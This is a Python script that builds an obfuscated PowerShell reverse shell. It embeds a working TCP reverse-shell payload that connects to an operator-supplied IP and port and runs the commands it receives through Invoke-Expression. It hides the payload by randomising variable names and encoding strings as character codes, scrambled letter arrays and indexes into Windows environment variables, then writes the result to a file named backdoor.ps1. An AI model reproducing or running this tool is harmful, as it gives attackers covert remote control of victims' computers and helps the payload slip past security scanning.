import re
import os
import random
import string

reverse_shell = """$ReverseShellConnection = (& (/New-Object/) (/System.Net.Sockets.TCPClient/)(((IP_ADDRESS), (PORT))));$NetworkStream = $ReverseShellConnection.(/GetStream/)();$ReadBuffer = (& (/New-Object/) Byte[] 65536);while (($BytesRead = $NetworkStream.(/Read/)($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {$CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead);$ExecutedOutput = (& (/Invoke-Expression/) $CommandOutput 2>&1) | & (/Out-String/);$PromptWithOutput = $ExecutedOutput + $(& (/Invoke-Expression/) (/[Environment]::UserName/))+'@'+$(& (/Invoke-Expression/) (/[System.Net.Dns]::GetHostName()/))+' ['+$(& (/Get-Location/))+']~$ ';$OutputBytes = ([text.encoding]::ASCII.(/GetBytes/)($PromptWithOutput));$NetworkStream.(/Write/)($OutputBytes, 0, $OutputBytes.(/Length/));$NetworkStream.(/Flush/)()};$ReverseShellConnection.(/Close/)()"""

variables_2_replace = ["ReverseShellConnection",
                       "NetworkStream",
                       "ReadBuffer",
                       "BytesRead",
                       "CommandOutput",
                       "ExecutedOutput",
                       "PromptWithOutput",
                       "OutputBytes"]

def list_2_character_2_string(match):
    if isinstance(match, str):
        command = match
    else:
        command = match.group(0)[1:-1]
        
    return r"[string]::join('',((" + ','.join(str(ord(character)) for character in command) +  r")|%{[char]$_}))"

def character_2_string(match):
    if isinstance(match, str):
        command = match
    else:
        command = match.group(0)[1:-1]
        
    return "+".join("[char]("+str(ord(c))+")" for c in command)

def random_string_2_string(match):
    if isinstance(match, str):
        command = match
    else:
        command = match.group(0)[1:-1]
        
    char_positions = [''] * 150
    indices_used = []
    
    for character in command:
        index = random.choice([i for i in range(150) if char_positions[i] == ''])
        char_positions[index] = character
        indices_used.append(index)
        
    for i in range(len(char_positions)):
        if char_positions[i] == '':
            char_positions[i] = random.choice(string.ascii_letters + string.digits)
            
    return "'" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join ''"

env = ["ALLUSERSPROFILE",
       "CommonProgramFiles",
       "ComSpec",
       "ProgramData",
       "ProgramFiles",
       "ProgramW6432",
       "PSModulePath",
       "PUBLIC",
       "SystemDrive",
       "SystemRoot",
       "windir"]

envMap = {}

for c in string.printable:
    envMap[c] = {}
    for v in env:
        val = os.getenv(v)
        if c in val:
            envMap[c][v] = []
            for i,t in enumerate(val):
                if c == t:
                    envMap[c][v].append(i)
                    
def env_hide(match):
    input_string = match.group(0)
    hidden_strings = []
    
    for c in input_string:
        if c in envMap and envMap[c]:
            pVars = list(envMap[c].keys())
            cVar = random.choice(pVars)
            pIndex = envMap[c][cVar]
            cIndex = random.choice(pIndex)
            hidden_strings.append(f"$env:{cVar}[{cIndex}]")
        else:
            rand = random.randint(1, 3)
            if rand == 1:
                hidden_strings.append(list_2_character_2_string(c))
            elif rand == 2:
                hidden_strings.append(character_2_string(c))
            else:
                hidden_strings.append(random_string_2_string(c))
    
    hidden_strings = hidden_strings[1:-1]
    return "+".join(hidden_strings)

ip_address = input("Enter IP: ")
port = input("Enter port: ")

reverse_shell = reverse_shell.replace("IP_ADDRESS", ip_address)
reverse_shell = reverse_shell.replace("PORT", port)

for variable in variables_2_replace:
    random_string = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
    reverse_shell = reverse_shell.replace(variable, random_string)
    
pattern = r"/.+?/"

for match in range(int(reverse_shell.count("/")/2)):
    reverse_shell = re.sub(pattern,
                           lambda m: random.choice([list_2_character_2_string, character_2_string, random_string_2_string, env_hide])(m),
                           reverse_shell,
                           count=1)
def script_to_char(s):
    return "([string]::join('',((" + ','.join(str(ord(c)) for c in s) + r")|%{[char]$_})))|invoke-expression"

with open('backdoor.ps1', 'w') as c:
    c.write(script_to_char(reverse_shell))
print("Check files for backdoor.ps1")
